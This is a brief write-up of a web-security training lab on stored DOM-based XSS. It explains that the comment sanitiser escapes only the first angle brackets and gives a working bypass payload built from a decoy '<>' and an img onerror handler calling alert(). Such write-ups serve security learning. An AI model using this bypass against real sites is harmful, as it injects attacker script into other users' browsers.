# Lab: Stored DOM XSS

**End Goal:** Exploit the stored DOM vulnerability to call the `alert()` function.

**Analysis**

*Comments are saved and then displayed by a client-side script that writes them to the page. Posting a test comment*

test<b>bold</b>

*It came as:*

test<b>bold

*This means only the first angle brackets were escaped and showed up as visible text.*

**Answer:** 

<><img src=x onerror=alert(1)>





